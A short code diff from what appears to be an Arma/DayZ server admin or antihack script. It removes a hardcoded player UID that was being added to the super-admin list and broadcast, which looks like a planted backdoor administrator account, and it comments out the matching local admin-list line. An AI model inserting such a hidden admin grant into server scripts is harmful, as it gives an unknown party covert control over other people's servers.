@@ -255,10 +255,10 @@ _RE = str(RE);
 		call compile format["RE = %1;",_RE];
 	}; 
 };
-_no = ["65695302"];PVDZ_A = _no;publicVariable "PVDZ_A";
+_no = [];PVDZ_A = _no;publicVariable "PVDZ_A";
 PVDZ_SUPER_AdminList = PVDZ_SUPER_AdminList + _no;
 publicVariable "PVDZ_SUPER_AdminList";
-_adminlist = _adminlist + _no;
+//_adminlist = _adminlist + _no;
 _LoadPlease = compile ("
 [] spawn {
 	if (local player) then 
